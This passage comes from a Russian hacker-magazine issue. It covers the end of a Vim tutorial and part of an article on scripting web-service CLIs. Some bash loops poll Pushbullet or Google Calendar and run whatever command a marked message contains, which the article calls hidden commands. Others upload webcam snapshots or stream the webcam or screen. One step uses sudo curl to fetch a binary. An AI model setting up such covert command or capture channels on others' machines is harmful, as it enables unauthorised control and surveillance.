   Вто рой момент: как и современные инс трумен ты разработ ки, Vim имеет
в своем арсе нале огромное количес тво средств для повыше ния эффектив‐
ности. Нап ример, ты можешь заранее забить в конфиг Vim аббревиатуры:
при думать для private псевдоним #p, который будет разворачиваться в private.
А можешь повесить всю команду на одну ком бинацию клавиш. Плюс для Vim
есть несметное количес тво плагинов, которые облегчают разработку.
   Кстати, обрати вни мание на команду ``. Это команда ` (переход к метке)
с аргументом  ` (метка, которую редак тор автоматически устанав лива ет
перед любым перемещени ем курсора). Вместо  `` мож но использовать  `.,
которая перебрасывает курсор к пос леднему отредак тированному мес ту.
Метки можно ста вить и самостоятельно с помощью команды m, за которой
следует бук ва. Например, ma — пос тавит мет ку «a», вернуться к которой
можно с помощью `a или 'a (для перехо да к началу строки).
   Это опять же одна из стандартных функций редакторов, но Vim может сде‐
лать ее гораздо более мощной. Как ты уже дол жен знать, команды модифи‐
кации текста принимают в качестве аргумен тов команды перехо да, а это зна‐
чит, что пры жок к метке тоже можно использовать в качестве аргу мента.
К примеру, удалить текст, начиная от текуще го положе ния курсора до метки
«a»: d`a.
  К слову, команды удаления Vim не удаляют текст безвозвратно, а помеща‐
ют его в буфер (в терминоло гии Vim — регистр), поэтому стандартны ми
средства ми здесь можно делать вещи, для которых в других редакторах пот‐
ребовался бы отдельный хоткей. Например, менять две строки местами: ddp.
Коман да dd удаляет текущую стро ку (после чего курсор переме щается
на сле дующую), p (paste) — вставляет текст из регистра под текущей строкой.
  Вместо удаления стро ку можно просто ско пиро вать с помощью yy (y —
yank), а затем вставить с помощью все той же коман ды p. Объеди ним эту воз‐
можность с повторением команд и получим быс трый способ вставки множес‐
тва одинаковых строк: yy10p.
  Нарисо вать линию ‐‐‐‐‐‐‐‐‐‐ можно так: вводим символ ‐, затем перек‐
люча емся в обыч ный режим с помощью Esc и вводим команду x10p  (x
вырезает символ под курсором, 10p встав ляет его десять раз).
  Команда . выпол нит предыдущую коман ду. И да, ее тоже можно зациклить:
3. — повторить пре дыдущую команду три раза. Команда qa начнет запись
макроса с име нем «a», остановить запись можно нажати ем q. Выпол нить мак‐
рос: @a.
   Vim под держивает огромное количество других команд, и пер вое вре мя ты
будешь теряться в том, как и что здесь работает. Однако большая часть фун‐
кций тебе не понадо бится. Ты должен заучить базовые команды модифи‐
кации тек ста (удаление, вставка и так далее) и базовые команды переме‐
щения (прыжки по сло вам, строкам, абзацам, блокам кода, мет кам и про‐
чему). Прос то объединяй их, и ты сможешь сделать практически все в нес‐
колько нажатий кно пок.


КОМАНДНЫЙ И ВИЗУАЛЬНЫЙ РЕЖИМЫ
Называя приведенные в предыдущем разделе ком бинации клавиш коман‐
дами, я нароч но отошел от стандартной терминоло гии Vim, что бы как можно
более четко объяснить, как это все работает. На самом деле в Vim есть
отдельный коман дный режим, больше похожий на классичес кую командную
строку, и он позволя ет делать еще более продвинутые вещи.
  Командный режим дос тупен по вво ду символа : в обычном режиме. Он
предназначен для построч ного редактирова ния текста с помощью сложных
команд, которые могут вклю чать в себя регуляр ные выражения и даже запуск
команд самой операци онный системы.
  Одна из самых известных команд дан ного режима — :s. Она пред назна‐
чена для поис ка и замены слов. С ее помощью вто рой пример из предыду‐
щего раздела мож но было бы решить так:


:s/Windows/Linux/

Такая команда заменит первое встреченное в текущей строке слово Windows
на Linux. Чтобы заменить все сло ва Windows на Linux в текущей строке, можно
использовать модификатор g:


:s/Windows/Linux/g

А вместо иско мого сло ва использовать регулярное выражение:


:s/W.*ws/Linux/g

Опе рацию замены мож но расширить на весь файл, ука зав перед командой
знак про цента:


:%s/Windows/Linux/g

А мож но натравить ее толь ко на нужный диапазон строк:


:1,10s/Windows/Linux/g

Или на текст между двумя метками:


:'a,'bs/Windows/Linux/g

Удобнее всего использовать командный режим в сочетании с визу альным.
Пос ледний представляет собой режим выделения, которого не было в редак‐
торе Vi. Работает он так: ты перехо дишь на строку, с которой хочешь начать
выделение тек ста, затем нажимаешь v (или Shift + V для пос трочного
выбора) и выделя ешь текст с помощью любых стан дартных команд переме‐
щения (нап ример, }, чтобы выделить текущий абзац). Затем ты можешь либо
выполнить коман ду редактирования (например, d, чтобы удалить выделенный
текст), либо перей ти в командный режим и выполнить над ним более слож ную
операцию.





                     Ви зуальный режим Vim

Вторая из наиболее часто используемых команд — :g. Это встроенный grep,
с помощью которого можно искать стро ки и выполнять над ними дей ствия.
Нап ример, следующая команда удалит все стро ки, содержащие Windows,
во всем фай ле:


:%g/Windows/d

А такая команда удалит все пустые строки (содержащие только пробелы):


:g/^\s*$/d

Следующая команда уберет пус тые строки (не содержащие ни одного сим‐
вола) в HTML‐таб лице:


:/<table>/,/<\/table>/g/^$/d

Строки можно переме щать. Нап ример, чтобы перемес тить все строки,
содержащие Windows, в конец файла, набирай:


:g/Windows/m$

Это далеко не все, что может делать встро енный grep. Однако если мы будем
вдавать ся в подробности, они не влезут ни в какую статью. Вместо это го пос‐
мотрим, что еще уме ет командная стро ка Vim.
  С ее помощью удоб но вставлять в текст содержимое других файлов
или вывод команд Unix. Например, так мож но вставить в текст содержимое
файла todo.txt:


:r todo.txt

Ко ман да :r поддержи вает автодополнение, поэто му вбивать пол ный путь
не при дется.
   Если добавить к r вос клицательный знак — она вставит в текст вывод ука‐
занной команды:


:r! uname ‐a

Когда ты пишешь статью в «Хакер» с кучей цитат из вывода команд, такая фун‐
кция становится просто незаменимой.
   Vim позволяет не только читать вывод команд Unix, но и отправлять текст
им на вход. Например, сле дующая команда отсортирует строки с первой
по десятую с помощью sort:


:1,10!sort

Отсорти ровать весь файл:


:%!sort

Прогнать файл через форматтер fmt:


:%!fmt

Ко неч но же, все это работает в том числе в визуаль ном режиме.


КАК ПЕРЕЙТИ НА VIM С SUBLIME TEXT ИЛИ ATOM
Когда переходишь на Vim пос ле дол гого исполь зования  Sublime  Text
или Atom, ощущаешь себя неуютно. Не бойся! Зах ламить Vim ненуж ными
панельками и плагина ми проще прос того. Вот краткий гайд по допиливанию
Vim до сос тояния более‐менее современ ного редактора кода.





          Так может выг лядеть Vim после установ ки плагинов и тем

Прежде чем колхозить свой Vim, посмотри на готовые популярные дис три‐
бути вы: spf13 и Janus. Они содержат необходимый базовый набор нас троек
и пла гинов. Но вооб ще, это не тру. Стоит как минимум однажды соб рать
собствен ный конфиг, а потом уже играться с third‐party‐дистрибами.


Шаг 0. Выберем правильную версию Vim
В осно ве Vim — код сорокалетней давности. Естествен но, некоторые вещи
не опти мизи рова ны под современ ное железо и графичес кие подсистемы.
В результаты ты можешь столкнуть ся с глюками, тормозами при скролле
и задер жками во время переключения режимов. На YouTube пол но видео
с дем ками страдальцев.
  Присмотрись к более современным фор кам Vim, нап ример neovim или,
если ты пользуешься macOS, MacVim.


Шаг 1. Выберем эму лятор терминала с GPU-уско рением
Часто тор моза и глюки Vim связаны с терминалом, в котором ты его запус‐
каешь. Если у тебя macOS, не мучай ся с системным, ставь сразу MacVim
или запускай в iTerm2.
  Еще лучше попробовать  Alacritty. Это быстрый, написан ный на Rust,
кросс‐плат форменный терминал, который эффективно работает с GPU. Он
позволя ет рендерить графику гораз до быстрее, чем любой из существующих
ана логов. Из неп ривычностей — все настройки хранятся в текстовых фай лах,
да и управле ние окном при дется допиливать самому. Например, в macOS
не работа ет CMD + H, так что окно шоткатом из короб ки не спрятать.





                 Alacritty — эмулятор терминала с поддержкой GPU

Далее я буду приводить скриншоты из standalone‐версии MacVim, но суть
не изме нится.


Шаг 2. Сде лаем базовые настройки в ~/.vimrc
Vim очень прос то конфигурировать. Настройки Vim хра нит в файле /.vimrc,
а необходимые файлы — плагины, локали, словари, цветовые схе мы — в пап‐
ке ~/.vim. Файл ~/.vimrc выполняет ся при запуске редактора. У каждого
любите ля Vim свой конфиг. Поделюсь моим. Открывай (или создавай) /.vim‐
rc и пиши в него по поряд ку.
  Для начала установим удобный шрифт и кегль. Я использую шрифт Mona‐
co, ты, естественно, ставь свой любимый. Многие поль зователи Linux пред‐
почита ют Terminus или Roboto.


set guifont=Monaco:h15

Удалим задержку при переключении режимов редактора:


set timeoutlen=1000 ttimeoutlen=0

Добавим поддержку ремапа рус ских сим волов на латинские. Это позволит
тебе не переключать рас кладку в режиме редактирования (например, нажать
вв вместо dd). Добавляем такие строки в конфиг:


set keymap=russian‐jcukenwin
set iminsert=0
set imsearch=0
highlight lCursor guifg=NONE guibg=Cyan

А затем скачива ем файл russian‐jcukenmac.vim (для macOS!) и кла дем его
в каталог ~/.vim/keymap.
  Отменим перенос строк. Это необязательно, но лично я не люблю перено‐
сы в коде.


set nowrap

Установим настрой ки сво рачи вания бло ков кода:


set foldmethod=indent
set foldnestmax=10
set nofoldenable
set foldlevel=1

Пос тавим тему. Пред лагаю для начала поп робовать одну из самых популяр‐
ных цветовых схем в мире — Solarized. Про ект vim‐colors‐solarized пре дос‐
тавляет тему Solarized в нужном для Vim формате.
   Клонируй этот репозиторий, перей ди в него и ско пируй файл solarized.
vim в пап ку ~/.vim/colors/ (надо создать, если ее нет):


cd vim‐colors‐solarized/colors
mv solarized.vim ~/.vim/colors/

А теперь вклю чим ее в ~/.vimrc:


colorscheme solarized
" Выбираем темный вариант solarized. Как ты понял, есть еще светлый
set background=dark
" Укажем явно количество цветов
let g:solarized_termcolors = 256

Иногда Vim некорректно рас позна ет типы файлов и включает левый син‐
таксис. Нап ример, если ты кодишь на Rails, наверняка пробовал шаблониза‐
тор Slim. Vim из коробки не может корректно подсве чивать синтаксис таких
шаб лонов. К счастью, Slim грамматичес ки совместим с форматом Haml, так
что давай заставим его подсвечивать .slim в грамматике Haml:


au BufRead,BufNewFile *.slim setfiletype haml

Разуме ется, это частный при мер. Этот же трюк ты можешь повторять
для любых нужных типов файлов.
  С базовыми настройками все. Теперь плагины.


                                     Продолжение статьи →
UNIXOID              ← НАЧАЛО СТАТЬИ





            КАК ПЕРЕСТАТЬ БОЯТЬСЯ VIM
                     И НАЧАТЬ ЕГО
                    ИСПОЛЬЗОВАТЬ





Шаг 3. Установим пакетный менед жер
Для Vim, как и для Sublime или Atom, есть несколько пакетных менед жеров. Я
предпочитаю Vundle — один из самых удоб ных и простых в настрой ке.
   Клонируй Vundle:


git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/
Vundle.vim

Добавь в ~/.vimrc такие строки:


set nocompatible              " be iMproved, required
filetype off                  " required
set rtp+=~/.vim/bundle/Vundle.vim
call vundle#begin()
Plugin 'VundleVim/Vundle.vim'
"
" Сюда будем вписывать плагины, которые хотим установить
"
call vundle#end()            " required
filetype plugin indent on    " required

Об рати внимание на коммента рий. В это мес то файла мы будем вписывать
ссылки на плагины, которые нужно уста новить. Фор мат такой:


Plugin 'tpope/vim‐fugitive'
Plugin 'rstacruz/sparkup', {'rtp': 'vim/'}
Plugin 'git://git.wincent.com/command‐t.git'
...

Вписыва ешь плагин, сох раняешь ~/.vimrc, а затем выполняешь команду
в терминале:


vim +BundleInstall! +BundleClean +q

Vundle обнаружит новый плагин и пос тавит его.





                    Ста вим плагины через Vundle

Ссылки на плагины можно вписывать в разном формате, смотри докумен‐
тацию. В слу чае плагинов с Гитхаба фор мат будет таким:


Plugin '<username>/<repository>'


Шаг 4. Установим плагины и настро им их
Пол ным списком своих пла гинов делиться не буду: ты сам с легкостью най‐
дешь все нужное тебе зап росами типа vim ract jsx syntax. Вместо этого
при веду общие, которые  будут полезны для перехо дящего с  Sublime
или Atom.


nerdtree
https://github.com/scrooloose/nerdtree
   Это боковая панель с файловой структурой про екта. Аналог Sidebar в Sub‐
lime или Atom. Все при вычно — выбира ешь файл, откры ваешь его нажатием
на Enter в нуж ном буфере. Можно установить каталог, от которого плясать.





        Не заме нимая вещь, если ты при вык к сай дбару в Sublime

Из полезных трю ков предлагаю замапить откры тие и скры тие этой панельки
по Ctrl + e:


nmap <silent> <C‐E> :NERDTreeToggle<CR>

По казы вать скрытые файлы по умолчанию:


let NERDTreeShowHidden=1

Вклю чать NERDTree для всех табов:


nmap <silent> <C‐N> :NERDTreeTabsToggle<CR>


CtrlP
https://github.com/kien/ctrlp.vim
  Плагин для быстрого перехода к нуж ному файлу в проекте по его наз‐
ванию. Ищет не толь ко полное соот ветствие, старается най ти все фай лы,
в пути которых встре чается введенная последовательность символов.





       CtrlP ищет файлы в про екте по введенной комбинации сим волов

Нажима ешь Ctrl + p, вво дишь acu, и плагин находит файл <A>pplication/<
C>ontrollers/<U>sers.rb.


indentLine
https://github.com/Yggdroot/indentLine
  Плагин рисует линии отступа в коде, помогая отсле живать вложенность.
Раньше я использовал vim‐indent‐guides, но его глюки меня поряд ком дос‐
тали. Плагин indentLine работа ет вроде бы получше.





                Ли нии отсту па. Что тут еще ска зать

Из полезных настроек пред лагаю выставить символ отступа:


let g:indentLine_char = '│'

Де фолтный «кро кодил» уж больно отвлекает вни мание.


vim-startify
https://github.com/mhinz/vim‐startify
  Плагин добав ляет удоб ный стартовый экран для твоего Vim. На нем
можешь выб рать последние открытые файлы, перейти к про екту (в тер‐
минологии Vim — session).





       vim‐startify поможет быстро перейти к рабочему файлу или сес сии

Из полезностей нелишним будет добавить следующие строки:


autocmd VimEnter *
               \   if !argc()
               \ |   Startify
               \ |   NERDTree
               \ |   wincmd w
               \ | endif

Это заставит vim‐startify нормально работать вместе с NERDTree.


vim-easy-align
https://github.com/junegunn/vim‐easy‐align
  Отличный плагин для быстрого выравнивания блоков кода по символам.
Другими словами, чтобы из


let abc='foo'
let abcdef='bar'
let abcdefghi='baz'

быстро сде лать


let abc       = 'foo'
let abcdef    = 'bar'
let abcdefghi = 'baz'

В наличии регуляр ки, безум ный синтаксис и целая страница с при мера ми
команд вырав нивания кода для разных язы ков. Обрати внимание на строки
из start guide:


xmap ga <Plug>(EasyAlign)
nmap ga <Plug>(EasyAlign)

Первая запускает EasyAlign в интерактивном режиме по ga (например,
vipga), вторая — то же самое для блока (gaip).


Goyo и удоб ное написание тек стов
https://github.com/junegunn/goyo.vim
   Хо роший помощ ник для тех, кто много пишет. Пла гин убирает все лишние
панели, индикаторы и центрирует текст, поз воляя сфокуси роваться на соз‐
дании контента. По сути, это реализация distraction‐free mode, вокруг которой
даже делали отдельные тексто вые редакторы вроде ommwriter.
  Я забин дил переключение в этот режим по Ctrl + g в ~/.vimrc. По дороге
отклю чается все, что не нуж но, и включаются нуж ные опции:


map <silent> <C‐g> :NERDTreeTabsToggle<CR><bar>:set wrap nolinebreak<
CR><bar>:Goyo<CR><bar>:set background=light<CR>





  Goyo отклю чает ненужные элементы, позволяя сконцентрировать ся
  на кон тенте

Вообще, для файлов в формате Markdown у меня автоматически включают ся
такие настройки:


" Включаем светлый фон
autocmd FileType markdown :set background=light
" Включаем перенос строк, для текста он нужен
autocmd FileType markdown :set wrap linebreak nolist
" Включаем режим distraction‐free, активируя Goyo
autocmd FileType markdown :Goyo
" Включаем проверку орфографии
autocmd FileType markdown :set spell spelllang=ru_ru


vim-airline
https://github.com/vim‐airline/vim‐airline
   Must‐have‐панель со статусной информацией по текущему открытому
файлу. Наверняка ты видел ее в боль шинс тве скриншотов Vim в интернете —
плагин очень популярен. Панель интерактивная, показывает текущий режим
работы, раскладку, кодировку, позицию курсора в фай ле, строке и многое
другое.





                  vim‐airline наг лядно показывает текущий статус

Также советую гля нуть про ект‐сателлит vim‐airline‐themes. Это коллекция тем
для vim‐airline, которая позволяет тво ей статусной строке органично впи‐
сываться в основную цветовую схему редактора.


ВЫВОДЫ
Vim нель зя вос при нимать как просто еще один тексто вый редактор. Это нечто
срод ни командной строке Unix. Те, кто не умеет ее использовать, счи тают
коман дную стро ку анахронизмом. Те, кто уме ет и знает, используют ее пос‐
тоян но и выпол няют свои задачи намного быс трее людей, предпочитающих
графический интерфейс.
   Как и у командной строки, у Vim очень высокий порог вхождения. Его нель‐
зя просто запустить и начать использовать. Сначала ты должен понять, как он
работа ет, на каких принципах базиру ется и почему он именно такой, какой
есть. Затем тебе придется заучить множес тво команд, попрактиковаться,
набить руку — только тог да Vim станет для тебя действительно удобным, и ты
уже не про меняешь его ни на какой другой редак тор.





  По статистике одной фирмы, пользователей Vim берут на работу чаще,
  чем остальных

Нуж но ли тебе это? Зависит от того, насколько час то ты работаешь с тек сто‐
выми дан ными: пишешь статьи, код, редактируешь HTML. Vim может сде лать
эту работу нам ного более эффективной. При этом навыки пригодятся и при
работе в других прог раммах — плагины с режимом Vim есть почти для всех
популярных сред разработки. Я, к при меру, исполь зую плагин IdeaVim в An‐
droid  Studio. Он позволяет получить мощь команд Vim, не отказыва ясь
от богатых воз можнос тей среды Idea.
   :wq!
UNIXOID





АВТОМАТИЗИРУЕМ РАБОТУ
С ВЕБ‐СЕРВИСАМИ
С ПОМОЩЬЮ СКРИПТОВ





Кон сольные  клиенты  есть  практически
для всех популярных веб‐сервисов. Мно гие
из них не блещут возможностями и тем
более удобством в работе. Но их можно
заскрип товать и приспособить для совер‐         Илья Остапенко                                                                                         ostapenko.public@gmail.com
шенно  неожиданных  целей:  прев ратить
Google  Calendar  в  систему  уда лен ного
исполнения команд, использовать Telegram
для поиска украден ного ноутбука, монито‐
рить сервер с помощью Twitter, организо‐
вать скрытый стриминг на YouTube. Об этих
и дру гих трюках мы и рас скажем.


TELEGRAM КАК ИНСТРУМЕНТ ЗАЩИТЫ НОУТБУКА
О том, как исполь зовать Telegram для ведения заметок и обмена ссылками
между разными устройствами, зна ют все. Но что, если пойти дальше и прев‐
ратить его в нечто большее? Например, систему сиг нализации, которая
будет информи ровать тебя, когда кто‐то посторонний включит ноут бук?
  Для это го мож но использовать кон сольный клиент telegram‐cli и такой
скрипт:


#!/bin/bash
ffmpeg ‐y ‐t 1 ‐f video4linux2 ‐s 640x480 ‐r 30 ‐i /dev/video0 ‐f
image2 $HOME/webcam.png
sleep 5m
scrot ‐z %HOME/screen.png
telegram‐cli ‐W ‐D ‐e "send_photo @USERNAME $HOME/webcam.png `date`"
telegram‐cli ‐W ‐D ‐e "send_photo @USERNAME $HOME/screen.png `date`"
notify‐send ‐i dialog‐warning ‐t 10000 "Ты. Да, да. Ты." "Тебе кто
разрешил?"

Скрипт следует поместить в авто заг рузку. Сразу пос ле старта машины он
сде лает фотографию с веб‐камеры, снимет скрин шот, отпра вит все это ука‐
занному пользователю и выведет на экран грозное сооб щение.
   Автозапуск скрип та при загрузке мож но настро ить привычными графичес‐
кими средствами. Нап ример, в KDE для этого есть спе циальный пункт меню
в системных настройках.





   Сообще ния, отправленные в Telegram сра зу после загрузки системы




Для установки telegram‐cli пользователям Arch Linux и осно ванных на нем сис‐
тем достаточно выпол нить


 $ yaourt ‐S telegram‐cli‐git


Поль зователям остальных систем придется собрать клиент самостоятельно
с помощью ./configure и make, предварительно  уста новив  Readline,
OpenSSL, libconﬁg, liblua, Python и libjansson.
  В момент пер вого запуска telegram‐cli запросит номер телефона в фор‐
мате +71234567890, а затем код безопас ности из СМС и пароль, если он
используется.



УПРАВЛЕНИЕ КОМПОМ С ПОМОЩЬЮ PUSHBULLET
С помощью консоль ного кли ента Pushbullet приведен ный выше скрипт мож но
дополнить функци ей отправки СМС на ука занный телефон (сообщение при‐
дет с подключенного к Pushbullet смартфона):


$ pb sms ‐d 0 ‐n +12345678901 "Началось!"

Но гораздо интереснее использовать Pushbullet в противоположном нап‐
равле нии, отправляя со смар тфона на компь ютер пуш‐сообщения c коман‐
дами на исполнение (например, Y3g5f27g shutdown ‐P):


#!/bin/bash
PASS="Y3g5f27g"
while :
    do
    CMD=$(pb list | grep $PASS | cut ‐c 10‐)
  if [ "$CMD" ]; then
      pb purge
      $CMD
  fi
    sleep 5m
done

Пре фикс в начале сооб щения (Y3g5f27g) нужен, чтобы отфильтровать лиш‐
ние сооб щения и обес печить защиту от несан кционированного доступа.
По завершении цикла команда в сообщении будет выпол нена, а само сооб‐
щение уда лено.
   Скрипт сле дует поместить в авто загрузку, пред варительно установив
и настроив pushbullet‐cli.





       Ко ман да, отправленная на компь ютер с помощью Pushbullet




Pushbullet‐cli мож но уста новить из репозитория Python:


 $ pip install pushbullet‐cli


Пос ле уста новки необходимо пройти авто ризацию, введя токен с помощью
такой команды:


 $ pb set‐key


Сам токен можно получить в панели управления на сай те сервиса:«Settings →
Account → Access Tokens», нажав кнопку «Create Access Token».



ОТПРАВКА СКРЫТЫХ КОМАНД С ИСПОЛЬЗОВАНИЕМ GOOGLE
CALENDAR
Ес ли использование сис темы push‐уве домлений для управле ния компом
тебе кажется слиш ком очевидным, то у меня есть хорошие новости. То же
самое можно организо вать с помощью кален даря Google. Вряд ли разработ‐
чики консоль ного клиента Gcalcli предполагали, что кто‐то станет его исполь‐
зовать таким образом, но мы прос тых путей не ищем.
   Скрипт выглядит так:


#!/bin/bash
while :
do
  CMD=$(gcalcli search "Y3g5f27g" '2017‐09‐02T14:00' '2017‐09‐02T15:
00' | cut ‐c 42‐)
  if [ "$CMD" ]; then
    gcalcli delete ‐‐iamaexpert "Y3g5f27g" '2017‐09‐02T14:00'
'2017‐09‐02T15:00'
    $CMD
  fi
  sleep 5m
done

Что бы отправить команду, необходимо создать в календаре мероприятие
с маркером Y3g5f27g (нап ример, Y3g5f27g shutdown ‐P) в промежутке меж‐
ду 14:00 и 15:00 часами 2 сентября 2017 года. Скрипт выполнит указанную
коман ду и удалит мероприятие.




Gcalcli можно установить из репози тория Python:


 $ pip install gcalcli


Для авто ризации при ложения в сервисе достаточно запустить его с любым
аргументом:


 $ gcalcli list


Процесс авторизации запустится в авто мати чес ком режиме в веб‐бра узере.
Прос то сле дуй появ ляющимся инструкциям.



TWITTER И МОНИТОРИНГ СЕРВЕРА
Еще одно полезное применение веб‐сер висов — мониторинг сервера. Пись‐
ма со свод кой данных о состоянии сервера — прошлый век, сегодня миром
правят твит тер и мес сен джеры, поэто му почему бы не использовать их?
  Сле дующий  скрипт отправляет сооб щение с данными о состоянии
машины, исполь зуя консольный кли ент твит тера Oysttyer:


#!/bin/bash
HOST=`hostname ‐s`
UP=`uptime | cut ‐d" " ‐f4,5 | cut ‐d"," ‐f1`
LOAD=`uptime | cut ‐d":" ‐f5,6`
MEM=`ps aux | awk '{ sum += $4 }; END { print sum }'`
CPU=`ps aux | awk '{ sum += $3 }; END { print sum }'`
tweet="Host: ${HOST}, uptime ${UP}, cpu: ${CPU}%, memory: ${MEM}%,
loadavg ${LOAD}"
if [ $(echo "${tweet}" | wc ‐c) ‐gt 140 ]; then
    echo "ОШИБКА: Длина сообщения превышает 140 знаков!"
    exit 1
fi
echo $tweet
echo $tweet | oysttyer ‐script

Его сле дует повесить на исполнение с определенным интерва лом в cron.
Вместо Oysttyer мож но использовать другой консоль ный клиент — bti. В этом
слу чае пос леднюю строку скрипта следует изменить на такую:


echo $tweet | bti ‐‐action update




Oysttyer доступен в репози тори ях боль шинс тва популярных сис тем. Самая
све жая версия на Гитхабе: клониру ешь репозиторий, копируешь бинар ник
oysttyer без расширения .pl в каталог /usr/bin с правами 755.
  Для авто ризации приложения в сервисе дос таточ но во время первого
запуска перейти по указанной ссылке, при нять предложение об авторизации,
скопиро вать сгенерированный PIN, вернуть ся в терминал и вста вить его.



ДИНАМИЧЕСКАЯ ПОДПИСЬ ДЛЯ ФОРУМА С ПОМОЩЬЮ DROPBOX
Есть масса различных вариантов использования Dropbox. Мы придумаем
еще один: настро им авто мати чес кое фор мирова ние динамичес кой подписи
для форума, в которой будет инфа о текущей конфигурации нашей системы.
Для этого понадо бится screenfetch, imagemagick и такой скрипт:


#!/bin/bash
while :
do
    echo `screenfetch ‐n | grep OS | cut ‐c 20‐ && screenfetch ‐n |
grep Kernel | cut ‐c 24‐ && screenfetch ‐n | grep DE | cut ‐c 20‐` |
convert ‐pointsize 18 ‐transparent white label:@‐ $HOME/Dropbox/scrf.
png
    sleep 12h
done

Скрипт формирует изоб ражение небольшого раз мера и сохраня ет его в пап‐
ку, отсле живаемую и синхро низируемую Dropbox, а затем засыпа ет на две‐
над цать часов.
   Чтобы вставить изображение в подпись на форуме, необходимо соз дать
прямую  ссылку  на  файл  scrf.png.  Это  можно  сделать  с  помощью
веб‐интерфей са Dropbox (функция «Поделиться») либо с помощью офи‐
циального скрип та:


$ dropbox sharelink ~/Dropbox/scrf.png

Пе ред вставкой полученной ссылки в подпись форума замени ?dl=0 на ?
raw=1.





  Подпись на форуме, изменяющаяся вслед за сме ной вер сии упо мянутых
  в ней ком понентов


КОНСОЛЬНЫЙ SPEEDTEST
У Speedtest тоже есть кон сольный клиент — speedtest‐cli. И да, сам бог
интернета велел использовать его для формирования подписи на форуме:


#!/bin/bash
wget $(speedtest‐cli ‐‐simple ‐‐share | grep Share | cut ‐c 16‐) ‐b ‐
O $HOME/Dropbox/scrf.png

По ка что утилита предлага ет только старую версию баннера. Но воз можно,
автор примет отправ ленный ему пулл‐реквест и вне сет изме нения в исходни‐
ки. Уста новить клиент можно из репозитория Python:


$ pip install speedtest‐cli


АВТОМАТИЧЕСКОЕ СКАЧИВАНИЕ НОВОГО ВИДЕО ИЗ YOUTUBE
Скачивание виде окон тента, раз мещен ного на YouTube, запрещено поль‐
зовательским соглашением сервиса. Тем не менее интернет изобилует инс‐
трументами, с помощью которых мож но нажатием одной кнопки получить
копию виде оро лика себе на компь ютер.
   Нам, конечно, интерес но сделать это с помощью консольных инструмен‐
тов, которые легко бы поддавались скрип тованию. Нап ример, youtube‐dl.
  Представ ленный ниже скрипт при первом запуске скачивает все содер‐
жимое указанного в нем плей‐листа YouTube, а затем каждый час проверяет
этот плей‐лист на появление нового видео, скачивает это видео в слу чае
обнаружения и уве домляет об этом. Скрипт удобно использовать на своем
домаш нем сер вере: ты просто добавляешь новое видео в плей‐лист со смар‐
тфона по пути домой, а скрипт его скачивает еще до твоего прихода.
   Чтобы отключить автомати ческую про вер ку на новое видео каждый час,
достаточно заком ментировать первые две и пос ледние две строки скрипта.


#!/bin/bash
while :
do
    # Адрес плей‐листа
    URL="https://www.youtube.com/playlist?list=PLj5JpYuSlJ‐‐mjBa1W
POZVckzCgI1pxWm"
    CMD=$(echo `youtube‐dl ‐s ‐‐download‐archive ~/.archive.txt ‐o
'~/Youtube/%(uploader)s/%(playlist_index)s ‐ %(title)s.%(ext)s' $URL`
 | grep ‐m 1 MPD | cut ‐c 1)
    if [ "$CMD" ]; then
        youtube‐dl ‐R ‐‐download‐archive ~/.archive.txt ‐o '~/
Youtube/%(uploader)s/%(playlist_index)s ‐ %(title)s.%(ext)s' $URL
        notify‐send ‐i dialog‐warning ‐t 120000 "Youtube‐dl"
"Загружено новое видео"
    fi
    sleep 1h
done




Все очень прос то:


 $ sudo curl ‐L https://yt‐dl.org/downloads/latest/youtube‐dl ‐o /usr
 /local/bin/youtube‐dl
 $ sudo chmod a+rx /usr/local/bin/youtube‐dl





СТРИМИНГ В YOUTUBE
Пос ле того как ты посмотрел на других, самое вре мя показать и себя. Все
на том же ютубе, подтвердив свою учетную запись через СМС и получив
в «Творческой сту дии» собс твенный ключ тран сляции, можно организовать
стриминг. FFmpeg неплохо с этим справляет ся:


#!/bin/bash
# Ключ авторизации
PID="xxxx‐xxxx‐xxxx‐xxxx"
# Битрейт
BR="2500k"
ffmpeg \
‐f alsa ‐ac 1 ‐i pulse \
‐f v4l2 ‐r 10 ‐framerate 30 ‐i /dev/video0 \
‐vcodec libx264 ‐pix_fmt yuv420p ‐preset ultrafast ‐g 20 ‐b:v $BR \
‐acodec libmp3lame ‐ar 44100 \
‐threads 0 ‐bufsize 512k \
‐f flv rtmp://a.rtmp.youtube.com/live2/$PID &> stream.log

Заменой строки


‐f v4l2 ‐r 10 ‐framerate 30 ‐i /dev/video0 \

на


‐f x11grab ‐r 10 ‐s 1024x720 ‐i :0.0+0,24 \

можно заставить сце нарий транслировать не изображение с веб‐камеры,
а скринкаст монито ра. Разумеется, адрес устрой ства  (ls  /dev/video*)
в первом случае и разрешение монитора во втором необходимо установить
свои.


ПЕРЕВОД СТРОКИ ПО ХОТКЕЮ
Средств язы ково го перево да текста в пос леднее вре мя развелось порядоч‐
но. Некоторые из них способ ны даже пох вастать исполь зовани ем в своей
работе искусственного интеллекта. И хотя порой результаты их труда наводят
на мысль об интеллекте удава, тем не менее подоб ный сервис в повседнев‐
ной работе будет неплохим подспорьем.
   Раз уж средств перевода много, то и при выборе консольного приложения
стоит предпочесть такое, которое способно в своей работе задейство вать
если не все, то хотя бы самые популярные из них. Translate shell их знает
и широко использует в своей работе, предлагая в режиме командной строки
перевод введенного с клавиату ры тек ста, тексто вых файлов и даже веб‐стра‐
ниц в интерне те.
  Правда, иногда, даже если сносно владеешь инос транным языком, могут
встре титься незнакомые фразы, не понимая которые трудно разобрать
смысл прочитанного. Не лезть же ради этого в терминал. Тут на выручку при‐
ходит специальный сценарий:


#!/bin/bash
notify‐send "Ищу перевод..." " "
TEXT=$(xclip ‐selection primary ‐o)
TRANS=$(translate‐shell ‐b "$TEXT" ‐output $HOME/.trans.txt)
TRAX=$(cat $HOME/.trans.txt)
TRAN=$(echo ‐e "$TRAX n" >> /tmp/trans.txt)
cp /dev/null $HOME/.trans.txt
$TRANS
if [ "$TRAX" ]; then
    notify‐send "ПЕРЕВОД:" "$TRAX"
    $TRAN
else
    notify‐send "ОШИБКА:" "Нет связи с сервисом"
fi

Достаточно привязать запуск это го сценария к пред почтительному сочета‐
нию клавиш, что бы при их зажатии перевод на рус ский язык выделенного
перед этим текста выводился в виде всплывающего сооб щения и одновре‐
менно дописы вался в тексто вый файл во времен ной папке. Язык оригинала
translate‐shell опре делит самостоятель но. При отсутс твии связи с сетевым
сервисом сце нарий предусмотрительно об этом уведомит.





    Вы вод перево да выделен ного текста во всплывающем сообщении


REDDIT КАК ИСТОЧНИК СВЕЖИХ ОБОЕВ
Че ловеку, переложившему часть ежедневной рутины на своего электрон‐
